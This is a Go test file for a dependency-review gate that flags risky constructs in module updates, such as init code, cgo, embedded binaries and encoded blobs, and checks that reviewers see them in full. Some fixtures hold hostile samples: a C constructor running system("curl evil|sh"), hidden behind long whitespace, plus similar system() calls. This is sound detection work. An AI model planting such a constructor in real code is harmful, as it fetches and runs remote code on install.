package gomod

import (
	"bytes"
	"debug/elf"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strings"
	"sync"
	"testing"

	"github.com/sadbox/dep-review/internal/eco/ecoutil"
	"github.com/sadbox/dep-review/internal/model"
)

// minimalELF is a small, well-formed ELF relocatable object: a symbol
// table, its string table and the section name table. The gate reads its
// structure to the end.
func minimalELF() []byte {
	shstr := []byte("\x00.symtab\x00.strtab\x00.shstrtab\x00")
	strtab := []byte("\x00start\x00")
	sym := make([]byte, 48)
	binary.LittleEndian.PutUint32(sym[24:], 1)
	off := 64
	symOff := off
	off += len(sym)
	strOff := off
	off += len(strtab)
	shOff := off
	off += len(shstr)
	var b bytes.Buffer
	h := elf.Header64{Type: uint16(elf.ET_REL), Machine: uint16(elf.EM_X86_64), Version: 1,
		Shoff: uint64(off), Ehsize: 64, Shentsize: 64, Shnum: 4, Shstrndx: 3}
	copy(h.Ident[:], "\x7fELF")
	h.Ident[elf.EI_CLASS] = byte(elf.ELFCLASS64)
	h.Ident[elf.EI_DATA] = byte(elf.ELFDATA2LSB)
	h.Ident[elf.EI_VERSION] = 1
	binary.Write(&b, binary.LittleEndian, h)
	b.Write(sym)
	b.Write(strtab)
	b.Write(shstr)
	for _, s := range []elf.Section64{{},
		{Name: 1, Type: uint32(elf.SHT_SYMTAB), Off: uint64(symOff), Size: uint64(len(sym)), Link: 2, Entsize: 24},
		{Name: 9, Type: uint32(elf.SHT_STRTAB), Off: uint64(strOff), Size: uint64(len(strtab))},
		{Name: 17, Type: uint32(elf.SHT_STRTAB), Off: uint64(shOff), Size: uint64(len(shstr))},
	} {
		binary.Write(&b, binary.LittleEndian, s)
	}
	return b.Bytes()
}

var (
	goELFOnce sync.Once
	goELF     []byte
	goELFErr  error
)

// builtGoELF is a real, statically linked Go program for linux/amd64,
// built once by the test.
func builtGoELF(t *testing.T) []byte {
	t.Helper()
	goELFOnce.Do(func() {
		dir, err := os.MkdirTemp("", "gomod-elf-")
		if err != nil {
			goELFErr = err
			return
		}
		defer os.RemoveAll(dir)
		os.WriteFile(filepath.Join(dir, "go.mod"), []byte("module example.com/hello\n\ngo 1.21\n"), 0o644)
		os.WriteFile(filepath.Join(dir, "main.go"), []byte("package main\n\nfunc main() { println(\"hello\") }\n"), 0o644)
		cmd := exec.Command("go", "build", "-trimpath", "-ldflags=-s -w", "-o", "hello", ".")
		cmd.Dir = dir
		cmd.Env = append(os.Environ(), "GOOS=linux", "GOARCH=amd64", "CGO_ENABLED=0", "GOTOOLCHAIN=local", "GOFLAGS=")
		if out, err := cmd.CombinedOutput(); err != nil {
			goELFErr = fmt.Errorf("%v: %s", err, out)
			return
		}
		goELF, goELFErr = os.ReadFile(filepath.Join(dir, "hello"))
	})
	if goELFErr != nil {
		t.Fatalf("building the fixture: %v", goELFErr)
	}
	return goELF
}

func wrapped(b []byte) string {
	enc := base64.StdEncoding.EncodeToString(b)
	var w strings.Builder
	for i := 0; i < len(enc); i += 76 {
		w.WriteString(enc[i:min(i+76, len(enc))] + "\n")
	}
	return w.String()
}

// fileOf is the file a file-level item is about ("a.go (os/exec)" ->
// "a.go").
func fileOf(item string) string {
	f, _, _ := strings.Cut(item, " (")
	return f
}

// TestInvariantShownInFull: for every flagged code, an item may be on the
// review route only if the focused evidence shows it in full: the whole
// text of the file it is in, the whole declaration for init callees, a
// rendering read to its end for binaries and decoded blobs. Positive
// fixtures stay on the review route (so that route is reachable);
// negative ones go to a person.
func TestInvariantShownInFull(t *testing.T) {
	gen := "package p\n\n//go:generate echo hi\n"
	cases := []struct {
		name   string
		old    map[string]string
		cur    map[string]string
		code   string
		item   string
		review bool // must stay review-eligible
	}{
		{"init", nil, map[string]string{"a.go": "package p\n\nfunc init() { println(1) }\n"}, codeInit, "a.go", true},
		{"var initializer", nil, map[string]string{"a.go": "package p\n\nimport \"os\"\n\nvar x = os.Getenv(\"X\")\n"}, codeVarInit, "a.go", true},
		{"init callee",
			map[string]string{"a.go": "package p\n\nfunc init() { helper() }\n\nfunc helper() {}\n"},
			map[string]string{"a.go": "package p\n\nfunc init() { helper() }\n\nfunc helper() { println(2) }\n"}, codeInitCallee, "helper", true},
		{"blank import", nil, map[string]string{"a.go": "package p\n\nimport _ \"example.com/q\"\n"}, codeBlank, "a.go (example.com/q)", true},
		{"risky import", nil, map[string]string{"a.go": "package p\n\nimport \"os/exec\"\n\nvar _ = exec.Command\n"}, codeImport, "a.go (os/exec)", true},
		{"cgo", nil, map[string]string{"c.go": "package p\n\n// int f(void);\nimport \"C\"\n\nfunc G() { C.f() }\n"}, codeCgo, "c.go", true},
		{"linkname", nil, map[string]string{"l.go": "package p\n\nimport _ \"unsafe\"\n\n//go:linkname now runtime.nanotime\nfunc now() int64\n"}, codeLinkname, "l.go", true},
		{"go:generate", nil, map[string]string{"g.go": gen}, codeGenerate, "g.go", true},
		{"go:embed", nil, map[string]string{"e.go": "package p\n\nimport _ \"embed\"\n\n//go:embed x.txt\nvar s string\n", "x.txt": "x\n"}, codeEmbed, "e.go", true},
		{"C source", nil, map[string]string{"x.c": "int f(void) { return 1; }\n", "p.go": "package p\n"}, codeCSource, "x.c", true},
		{"C source with a NUL", nil, map[string]string{"x.c": "\x00int f(void) { system(\"id\"); }\n", "p.go": "package p\n"}, codeCSource, "x.c", true},
		{"assembly", nil, map[string]string{"x_amd64.s": "TEXT ·f(SB),0,$0\n\tRET\n", "p.go": "package p\n"}, codeAsm, "x_amd64.s", true},
		{"wrapped base64 of an ELF", nil, map[string]string{"b.go": "package p\n\nvar blob = `" + wrapped(minimalELF()) + "`\n"}, codeBlob, "b.go", true},
		{"blob of text", nil, map[string]string{"b.go": "package p\n\nvar s = \"" + strings.Repeat("QUJD", 300) + "\"\n"}, codeBlob, "b.go", true},
		{"blob of DER bytes", nil, map[string]string{"b.go": "package p\n\nvar s = \"" + base64.StdEncoding.EncodeToString(append([]byte{0x30, 0x82, 0x03, 0x00}, bytes.Repeat([]byte{0x02, 0x01, 0x00}, 300)...)) + "\"\n"}, codeBlob, "b.go", false},
		{"blob of text over the file cap", nil, map[string]string{"b.go": "package p\n\nvar s = \"" + strings.Repeat("QUJD", 140<<10) + "\"\n"}, codeBlob, "b.go", false},
		{"blob no decoder reads", nil, map[string]string{"b.go": "package p\n\nvar s = \"" + strings.Repeat("QUJD\\x01", 300) + "\"\n"}, codeBlob, "b.go", false},
		{"COFF .syso", nil, map[string]string{"w_windows_amd64.syso": string(coffObject(2, 64)), "p.go": "package p\n"}, codeBinary, "w_windows_amd64.syso", true},
		{"linked Go ELF .syso", nil, map[string]string{"g_linux_amd64.syso": "", "p.go": "package p\n"}, codeBinary, "g_linux_amd64.syso", true},
		{"embedded Go ELF", nil, map[string]string{"bin/tool": "", "e.go": "package p\n\nimport _ \"embed\"\n\n//go:embed bin/tool\nvar tool []byte\n"}, codeBinary, "bin/tool", true},
		{"truncated ELF .syso", nil, map[string]string{"x.syso": "\x7fELF\x02\x01\x01 truncated", "p.go": "package p\n"}, codeBinary, "x.syso", false},
		// Round 5: inert binaries. An image nothing parses stays on review
		// only while the gate proves it never reaches the build.
		{"inert PNG only a test mentions", nil, map[string]string{"fixtures/logo.png": png, "p.go": "package p\n", "p_test.go": "package p\n\nconst logo = \"fixtures/logo.png\"\n"}, codeBinary, "fixtures/logo.png", true},
		{"PNG a non-test file mentions", nil, map[string]string{"fixtures/logo.png": png, "p.go": "package p\n\nconst logo = \"fixtures/logo.png\"\n"}, codeBinary, "fixtures/logo.png", false},
		{"PNG embedded by non-test code", nil, map[string]string{"fixtures/logo.png": png, "p.go": "package p\n\nimport _ \"embed\"\n\n//go:embed fixtures/*.png\nvar logo []byte\n"}, codeBinary, "fixtures/logo.png", false},
		{"PNG with the reference search capped", nil, capped(map[string]string{"fixtures/logo.png": png, "p.go": "package p\n", "p_test.go": "package p\n\nconst logo = \"fixtures/logo.png\"\n"}), codeBinary, "fixtures/logo.png", false},
		{"COFF listing fewer sections than it has", nil, map[string]string{"x.syso": string(coffSections(5, 2)), "p.go": "package p\n"}, codeBinary, "x.syso", false},
	}
	elfBytes := builtGoELF(t)
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			for k, v := range tc.cur {
				if v == "" && strings.Contains(tc.name, "Go ELF") && (k == "g_linux_amd64.syso" || k == "bin/tool") {
					tc.cur[k] = string(elfBytes)
				}
			}
			var old = writeTreeOrNil(t, tc.old)
			h := CheckTrees(old, writeTree(t, tc.cur))
			if !slices.Contains(h.items(tc.code), tc.item) {
				t.Fatalf("%s %s not flagged (codes %q)", tc.code, tc.item, h.codes())
			}
			eligible := !slices.Contains(h.items(codeIncomplete), tc.code+" "+tc.item)
			if eligible != tc.review {
				t.Fatalf("review-eligible = %v, want %v; context:\n%.3000s", eligible, tc.review, strings.Join(h.ctx[tc.code][tc.item], ""))
			}
			if !eligible {
				return
			}
			// The invariant: what stays on review is shown in full.
			out := string(h.render("m"))
			ctx := strings.Join(h.ctx[tc.code][tc.item], "")
			switch tc.code {
			case codeInitCallee:
				if !strings.Contains(ctx, "new declaration (a.go:5):\n    | func helper() { println(2) }\n") {
					t.Errorf("declaration not shown whole:\n%s", ctx)
				}
			case codeBinary:
				// Review-eligible: rendered in full, or proven inert.
				if !strings.Contains(ctx, "(the gate read this structure to its end)") && !strings.Contains(ctx, "INERT, PROVEN by the gate") {
					t.Errorf("binary on review neither rendered in full nor proven inert:\n%s", ctx)
				}
			default:
				f := fileOf(tc.item)
				if !strings.Contains(out, quote("full text of the new version of "+f, tc.cur[f])) {
					t.Errorf("the full text of %s is not in the focused evidence:\n%.3000s", f, out)
				}
				if tc.code == codeBlob && !strings.Contains(ctx, "(the gate read this structure to its end)") && !strings.Contains(ctx, "the decoded text, in full") {
					t.Errorf("blob on review without its bytes shown in full:\n%s", ctx)
				}
			}
		})
	}
}

const png = "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR"

// capped adds enough files that the reference search stops before the
// end (maxRefFiles), sorting after everything else.
func capped(files map[string]string) map[string]string {
	for i := range maxRefFiles {
		files[fmt.Sprintf("zz/f%05d.txt", i)] = "x\n"
	}
	return files
}

func writeTreeOrNil(t *testing.T, files map[string]string) *ecoutil.Tree {
	if files == nil {
		return nil
	}
	return writeTree(t, files)
}

// coffSections is a COFF object whose header claims nsec sections while
// only have are present before the end of the file.
func coffSections(nsec, have int) []byte {
	var b bytes.Buffer
	binary.Write(&b, binary.LittleEndian, struct {
		Machine, NSec     uint16
		Time, Ptr, NSym   uint32
		OptSize, Characts uint16
	}{0x8664, uint16(nsec), 0, 0, 0, 0, 0})
	for i := range have {
		var sec [40]byte
		copy(sec[:], fmt.Sprintf(".s%d", i))
		b.Write(sec[:])
	}
	return b.Bytes()
}

// TestCompiledSourceNeverBinary (round 4, H1; the review's
// TestZZNulCSource): a C file with a NUL is quoted in full, the NUL shown
// as an escape, and the payload past any strings cap is there.
func TestCompiledSourceNeverBinary(t *testing.T) {
	var src strings.Builder
	src.WriteString("\x00/* x */\n")
	for i := range 310 {
		fmt.Fprintf(&src, "static int pad%03d = %d;\n", i, i)
	}
	src.WriteString(strings.Repeat(" ", 170) + "__attribute__((constructor)) static void e(void){system(\"curl evil|sh\");}\n")
	h := CheckTrees(nil, writeTree(t, map[string]string{"evil.c": src.String(), "p.go": "package p\n"}))
	out := string(h.render("m"))
	if !strings.Contains(out, "static void e(void){system(\"curl evil|sh\");}") || !strings.Contains(out, "    | <0x00>/* x */\n") {
		t.Errorf("compiled C source with a NUL is not quoted in full:\n%.2000s", out)
	}
	if strings.Contains(out, "the gate's rendering of evil.c") {
		t.Errorf("a compiled source took the binary path")
	}
}

// TestSamePlaceholderDistinctFiles (round 4, M1): two raw paths behind one
// item id keep their own texts and numbers, and the item shows both.
func TestSamePlaceholderDistinctFiles(t *testing.T) {
	h := newReport()
	const id = "<invalid-path:000000000000000000000000>"
	h.add(codeCSource, id, true, h.fileRef("é1.c", []byte("__attribute__((constructor)) static void e(void){system(\"x\");}\n")))
	h.add(codeCSource, id, true, h.fileRef("é2.c", []byte("int benign(void) { return 0; }\n")))
	out := string(h.render("m"))
	for _, want := range []string{"system(\"x\")", "int benign(void)", "### file 1: ", "### file 2: ",
		"full text: see \"### file 1\" below", "full text: see \"### file 2\" below"} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q in:\n%s", want, out)
		}
	}
	if a, b := safeFile("é1.c"), safeFile("é2.c"); a == b {
		t.Errorf("placeholders collide: %s", a)
	} else if len(a) != len("<invalid-path:>")+24 {
		t.Errorf("placeholder %q does not carry 12 hash bytes", a)
	}
}

// TestWrappedAndEscapedBlobs (round 4, M2; the review's TestZZWrappedBase64).
func TestWrappedAndEscapedBlobs(t *testing.T) {
	h := CheckTrees(nil, writeTree(t, map[string]string{"p.go": "package p\n\nvar blob = `" + wrapped(minimalELF()) + "`\n"}))
	if ctx := strings.Join(h.ctx[codeBlob]["p.go"], ""); !strings.Contains(ctx, "type: ELF") || len(h.items(codeIncomplete)) != 0 {
		t.Errorf("wrapped base64 of an ELF: incomplete %q\n%.2000s", h.items(codeIncomplete), ctx)
	}
	var e strings.Builder
	for _, c := range minimalELF() {
		fmt.Fprintf(&e, `\x%02x`, c)
	}
	h = CheckTrees(nil, writeTree(t, map[string]string{"q.go": "package p\n\nvar b = \"" + e.String() + "\"\n"}))
	ctx := strings.Join(h.ctx[codeBlob]["q.go"], "")
	if !strings.Contains(ctx, "its bytes are binary as written") || !strings.Contains(ctx, "type: ELF") || len(h.items(codeIncomplete)) != 0 {
		t.Errorf("escaped ELF literal: incomplete %q\n%.2000s", h.items(codeIncomplete), ctx)
	}
	_ = model.MaxFlagged
}
